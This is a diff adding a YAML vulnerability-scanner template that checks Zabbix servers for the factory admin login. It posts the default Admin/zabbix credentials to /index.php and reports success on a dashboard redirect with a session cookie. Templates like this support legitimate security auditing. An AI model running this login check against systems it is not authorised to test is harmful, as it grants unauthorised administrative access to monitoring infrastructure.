@@ -1,0 +1,17 @@
+detail:
+  author: fuzz7j(https://github.com/fuzz7j)
+  links:
+  - https://www.zabbix.com/documentation/3.4/zh/manual/quickstart/login
+expression: r0()
+manual: true
+name: poc-yaml-zabbix-default-password
+rules:
+  r0:
+    expression: response.status == 302 && response.headers["location"] == "zabbix.php?action=dashboard.view"
+      && response.headers["set-cookie"].contains("zbx_session")
+    request:
+      body: name=Admin&password=zabbix&autologin=1&enter=Sign+in
+      cache: true
+      method: POST
+      path: /index.php
+transport: http
